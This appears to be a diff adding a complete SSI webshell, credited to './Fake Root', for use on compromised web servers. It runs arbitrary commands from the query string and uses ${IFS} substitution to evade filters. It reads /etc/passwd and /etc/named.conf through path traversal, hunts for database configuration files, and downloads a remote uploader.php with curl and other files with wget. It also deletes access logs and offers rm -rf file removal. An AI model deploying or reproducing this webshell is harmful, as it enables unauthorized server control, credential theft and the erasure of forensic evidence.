@@ -1,0 +1,304 @@
+<!-- ig : f4k3_r00t -->
+
+
+<!--#config errmsg="Error / Webnya Ga Support SSI Command"-->
+<!--#set var="zero" value="" -->
+<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
+<!--#set var="shl" value="whoami" -->
+<!--#else -->
+<!--#set var="shl" value=$QUERY_STRING_UNESCAPED -->
+<!--#endif -->
+<html>
+<head>
+<title>SSI Webshell</title>
+<meta name="theme-color" content="#000">
+<meta name="Author" content="./Fake Root">
+<meta name="description" content="Security ? that just an illusion - ">
+<meta property="og:description" content="Security ? that just an illusion - ">
+</head>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@latest/pace-theme-default.min.css">
+<script language="javascript">
+
+function unknown45()
+{
+	var uri = document.getElementById('command').value;
+	var rep = uri.replace(/[ ]/g,'${IFS}');
+	var res = encodeURI(uri);
+	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+encodeURI(rep)+"&&test";
+}
+
+function refresh() {
+	document.location.href="<!--#echo var=DOCUMENT_NAME -->";
+}
+
+function checkfile() {
+	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+"ls${IFS}-la";
+}
+
+	function readpass() {
+		var selectedobj=document.getElementById('readpass');
+
+		if(selectedobj.className=='hide'){  //check if classname is hide 
+			selectedobj.style.display = "block";
+			selectedobj.readOnly=true;
+			selectedobj.className ='show';
+		}else{
+			selectedobj.style.display = "none";
+			selectedobj.className ='hide';
+ }
+}
+
+	function readnamed() {
+		var selectedobj=document.getElementById('readnamed');
+
+		if(selectedobj.className=='hide'){  //check if classname is hide 
+			selectedobj.style.display = "block";
+			selectedobj.readOnly=true;
+			selectedobj.className ='show';
+		}else{
+			selectedobj.style.display = "none";
+			selectedobj.className ='hide';
+ }
+}
+
+	function movefiles() {
+		var selectedobj=document.getElementById('movefiles');
+
+		if(selectedobj.className=='hide'){  //check if classname is hide 
+			selectedobj.style.display = "block";
+			selectedobj.readOnly=true;
+			selectedobj.className ='show';
+		}else{
+			selectedobj.style.display = "none";
+			selectedobj.className ='hide';
+ }
+}
+
+	function upfiles() {
+		var selectedobj=document.getElementById('upfiles');
+
+		if(selectedobj.className=='hide'){  //check if classname is hide 
+			selectedobj.style.display = "block";
+			selectedobj.readOnly=true;
+			selectedobj.className ='show';
+		}else{
+			selectedobj.style.display = "none";
+			selectedobj.className ='hide';
+ }
+}
+
+	function renamefiles() {
+		var selectedobj=document.getElementById('renamefiles');
+
+		if(selectedobj.className=='hide'){  //check if classname is hide 
+			selectedobj.style.display = "block";
+			selectedobj.readOnly=true;
+			selectedobj.className ='show';
+		}else{
+			selectedobj.style.display = "none";
+			selectedobj.className ='hide';
+ }
+}
+
+	function deletefiles() {
+		var selectedobj=document.getElementById('deletefiles');
+
+		if(selectedobj.className=='hide'){  //check if classname is hide 
+			selectedobj.style.display = "block";
+			selectedobj.readOnly=true;
+			selectedobj.className ='show';
+		}else{
+			selectedobj.style.display = "none";
+			selectedobj.className ='hide';
+ }
+}
+
+	function findfiles() {
+		var selectedobj=document.getElementById('findfiles');
+
+		if(selectedobj.className=='hide'){  //check if classname is hide 
+			selectedobj.style.display = "block";
+			selectedobj.readOnly=true;
+			selectedobj.className ='show';
+		}else{
+			selectedobj.style.display = "none";
+			selectedobj.className ='hide';
+ }
+}
+
+function addupload()
+{
+	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+"curl${IFS}-Ls${IFS}raw.githubusercontent.com/whoami-45/php-code/main/uploader.php${IFS}|${IFS}tee${IFS}-a${IFS}uploader.php";
+}
+
+function checkroot() {
+	var uri = "ls -la ";
+	var rep = uri.replace(/[ ]/g,'${IFS}');
+	var res = encodeURI(uri);
+	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+encodeURI(rep)+"<!--#echo var=DOCUMENT_ROOT -->";
+}
+
+function deletelog() {
+	var yakin = confirm("yakin hapus access logs nya ?");
+	if (yakin == true) {
+	var uri = "rm -rf ";
+	var rep = uri.replace(/[ ]/g,'${IFS}');
+	var res = encodeURI(uri);
+	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+encodeURI(rep)+"<!--#echo var=DOCUMENT_ROOT -->/../logs/ *";
+} else {
+	return true;
+}
+}
+
+function delsel() {
+	var uri = "rm -rf ";
+	var rep = uri.replace(/[ ]/g,'${IFS}');
+	var res = encodeURI(uri);
+	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+encodeURI(rep)+"<!--#echo var=DOCUMENT_NAME --> |${IFS}clear${IFS}&&${IFS}echo${IFS}Done";
+}
+
+function movesatu()
+{
+	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+"mv${IFS}"+document.getElementById('movefile').value+"${IFS}../"+document.getElementById('movefile').value+"${IFS}&&${IFS}realpath${IFS}../"+document.getElementById('movefile').value;
+}
+
+function movedua()
+{
+	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+"mv${IFS}"+document.getElementById('movefile').value+"${IFS}../../"+document.getElementById('movefile').value+"${IFS}&&${IFS}realpath${IFS}../../"+document.getElementById('movefile').value;
+}
+
+function movetiga()
+{
+	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+"mv${IFS}"+document.getElementById('movefile').value+"${IFS}../../../"+document.getElementById('movefile').value+"${IFS}&&${IFS}realpath${IFS}../../../"+document.getElementById('movefile').value;
+}
+
+function moveroot()
+{
+	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+"mv${IFS}"+document.getElementById('movefile').value+"${IFS}<!--#echo var=DOCUMENT_ROOT -->/"+document.getElementById('movefile').value+"${IFS}&&${IFS}realpath${IFS}<!--#echo var=DOCUMENT_ROOT -->/"+document.getElementById('movefile').value;
+}
+
+function upfile()
+{
+	var url = document.getElementById('linknya').value;
+	var https = url.split("https://").join("");
+	var http = https.split("http://").join("");
+	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+"wget${IFS}"+encodeURI(http)+"${IFS}"+"--no-check-certificate${IFS}&&${IFS}ls${IFS}-la";
+}
+
+function renamefile()
+{
+	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+"mv${IFS}"+document.getElementById('renameawal').value+"${IFS}"+document.getElementById('renameakhir').value+"${IFS}&&${IFS}ls${IFS}-la";
+}
+
+function deletefile()
+{
+	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+"rm${IFS}-rf${IFS}"+document.getElementById('deletefile').value+"${IFS}&&${IFS}ls${IFS}-la";
+}
+
+function deleteinroot()
+{
+	var yakin = confirm("yakin hapus file ini di directory root ?");
+	if (yakin == true) {
+	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+"rm${IFS}-rf${IFS}"+"<!--#echo var=DOCUMENT_ROOT -->/"+document.getElementById('deletefile').value+"${IFS}&&${IFS}ls${IFS}-la${IFS}<!--#echo var=DOCUMENT_ROOT -->";
+} else {
+	return true;
+}
+}
+
+function deletefiledua()
+{
+	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+"rm${IFS}-rf${IFS}"+document.getElementById('deletedir').value+"/"+document.getElementById('deletefiledua').value+"${IFS}&&${IFS}ls${IFS}-la${IFS}"+document.getElementById('deletedir').value;
+}
+
+function findfile()
+{
+	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+"du${IFS}-ah${IFS}"+"|${IFS}grep${IFS}"+document.getElementById('findfile').value;
+}
+
+function findinroot()
+{
+	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+"du${IFS}-ah${IFS}"+"<!--#echo var=DOCUMENT_ROOT -->${IFS}"+"|${IFS}grep${IFS}"+document.getElementById('findfile').value;
+}
+
+function findfiledua()
+{
+	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+"du${IFS}-ah${IFS}"+document.getElementById('finddir').value+"${IFS}|${IFS}grep${IFS}"+document.getElementById('findfiledua').value;
+}
+
+function finddb()
+{
+	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+"du${IFS}-ah${IFS}"+"<!--#echo var=DOCUMENT_ROOT -->${IFS}"+"|${IFS}grep${IFS}-e${IFS}config.php${IFS}-e${IFS}database.php${IFS}-e${IFS}config.inc.php${IFS}-e${IFS}koneksi.php";
+}
+</script>
+<style type="text/css">
+	.input {
+		background: transparent;
+		border-color: #ffffff;
+		border-width: thin;
+		border: groove;
+		cursor: pointer;
+	}
+
+	button {
+		cursor: pointer;
+	}
+</style>
+
+</head>
+<body onload="checkaja()">
+<font face=courier size=2><i><center>SSI Webshell by ./Fake Root<hr><font face="courier" size=2>
+<font size=2>Command : <input type=text size=60 id=command class="text" name="address1" style="max-width: 100%; max-height: 100%;">&nbsp;<button class="input" id="gas" onclick="unknown45();">Execute</button></center>
+	<br><br>Host : <b><!--#echo var=HTTP_HOST --></b>
+	<br>Server Address : <b><!--#echo var=SERVER_ADDR --></b>
+	<br>User : <b><!--#exec cmd="id" --></b>
+	<br>System : <b><!--#exec cmd="{uname,-nrv}" --></b>
+	<br><br>Current Path : <b><!--#echo var=DOCUMENT_ROOT --><!--#echo var=SCRIPT_NAME --></b><br></i>
+	Python : <b><!--#exec cmd="{test,-e,/usr/bin/python}&&{echo,ON}||{echo,OFF}" --></b>&nbsp;|&nbsp; MySql : <b><!--#exec cmd="{test,-e,/usr/bin/mysql}&&{echo,ON}||{echo,OFF}" --></b>&nbsp;|&nbsp; Perl : <b><!--#exec cmd="{test,-e,/usr/bin/perl}&&{echo,ON}||{echo,OFF}" --></b>&nbsp;|&nbsp;Ruby : <b><!--#exec cmd="{test,-e,/usr/bin/ruby}&&{echo,ON}||{echo,OFF}" --></b>&nbsp;|&nbsp;Wget : <b><!--#exec cmd="{test,-e,/usr/bin/wget}&&{echo,ON}||{echo,OFF}" --></b><hr>
+	<center><button onclick="refresh()" style="float: left;">Refresh</button> <button onclick="checkfile()">list file</button> <button onclick="renamefiles()">rename file</button> <button onclick="movefiles()">move file</button> <button onclick="deletefiles()">delete file</button> <button onclick="findfiles()">find file</button> <button onclick="upfiles()">upload file</button> <button onclick="delsel()" style="float: right;">Remove Shell</button><br><br>
+		<button onclick="readpass();">read /etc/passwd</button> <button onclick="readnamed();">read /etc/named.conf</button> <button onclick="addupload()">add uploader.php</button> <button onclick="checkroot()">check root directory</button> <button onclick="deletelog()">delete access logs</button></center>
+<hr></i>
+Executed Command : </font><b><font face="courier" id="cmd"><!--#echo var=shl --></font></b><br>
+<textarea bgcolor=#e4e0d8 cols=121 rows=15 style="width: 100%">
+<!--#exec cmd=$shl -->
+</textarea>
+<script>
+	var cmd = document.getElementById("cmd").innerHTML.split("${IFS}").join(" ");
+	document.getElementById("cmd").innerHTML = cmd;
+
+	var gaskan = document.getElementById("command");
+	gaskan.addEventListener("keyup", function(event) {
+		if (event.keyCode === 13) {
+			event.preventDefault();
+			document.getElementById("gas").click();
+		}
+});
+</script>
+<font face="courier" size="2" id="readpass" style="display:none"><br>Read : <b>/etc/passwd</b><br>
+	<textarea bgcolor=#e4e0d8 cols=121 rows=15><!--#include virtual="/../../../../../../../../../../../../../../etc/passwd" --></textarea>
+</font>
+<font face="courier" size="2" id="readnamed" style="display:none"><br>Read : <b>/etc/named.conf</b><br>
+	<textarea bgcolor=#e4e0d8 cols=121 rows=15><!--#include virtual="/../../../../../../../../../../../../../../etc/named.conf" --></textarea>
+</font>
+<font face="courier" size="2" id="movefiles" style="display:none"><br>Move file to <b>previous directory</b><br><br>
+	filename : <textarea bgcolor="#e4e0d8" cols="25" rows="1" id="movefile" style="resize: none; outline: none" required></textarea>
+	<button onclick="movesatu()">1 directory</button> <button onclick="movedua()">2 directory</button> <button onclick="movetiga()">3 directory</button> <button onclick="moveroot()">root directory</button>
+</font>
+<font face="courier" size="2" id="renamefiles" style="display:none"><br>Rename <b>file</b><br><br>
+	<textarea bgcolor="#e4e0d8" cols="25" rows="1" id="renameawal" style="resize: none; outline: none" required></textarea> to <textarea bgcolor="#e4e0d8" cols="25" rows="1" id="renameakhir" style="resize: none; outline: none" required></textarea><br><button onclick="renamefile()">Gaskan</button>
+</font>
+<font face="courier" size="2" id="upfiles" style="display:none"><br>Upload <b>file</b><br><br>
+	Link : <textarea bgcolor="#e4e0d8" cols="100" rows="1" id="linknya" style="resize: none; outline: none" required></textarea> <button onclick="upfile()">Gaskan</button>
+</font>
+<font face="courier" size="2" id="deletefiles" style="display:none"><br>delete <b>file</b><br>
+	<textarea bgcolor="#e4e0d8" cols="25" rows="1" id="deletefile" style="resize: none; outline: none" required></textarea> <button onclick="deletefile()">Delete</button> <button onclick="deleteinroot()">Delete this in root directory</button><br><br>delete <b>file</b> in <b>custom directories</b><br><textarea bgcolor="#e4e0d8" cols="25" rows="1" id="deletefiledua" style="resize: none; outline: none" required></textarea> in directory <textarea bgcolor="#e4e0d8" cols="25" rows="1" id="deletedir" style="resize: none; outline: none" required></textarea> <button onclick="deletefiledua()">Delete</button>
+</font>
+<font face="courier" size="2" id="findfiles" style="display:none"><br>find <b>files</b><br>
+	<textarea bgcolor="#e4e0d8" cols="25" rows="1" id="findfile" style="resize: none; outline: none" required></textarea> <button onclick="findfile()">Find</button> <button onclick="finddb()">find database location (beta)</button> <button onclick="findinroot()">Find this in root directory</button><br><br>find <b>files</b> in <b>custom directories</b><br><textarea bgcolor="#e4e0d8" cols="25" rows="1" id="findfiledua" style="resize: none; outline: none" required></textarea> in directory <textarea bgcolor="#e4e0d8" cols="25" rows="1" id="finddir" style="resize: none; outline: none" required></textarea> <button onclick="findfiledua()">Find</button>
+</font>
+<hr>
+<center>
+	<font face="courier" size=2>./Fake Root - 2018<br><a href="https://fake-root.blogspot.com" target="_blank">https://fake-root.blogspot.com</a></font></center>
+</body>
+</html>
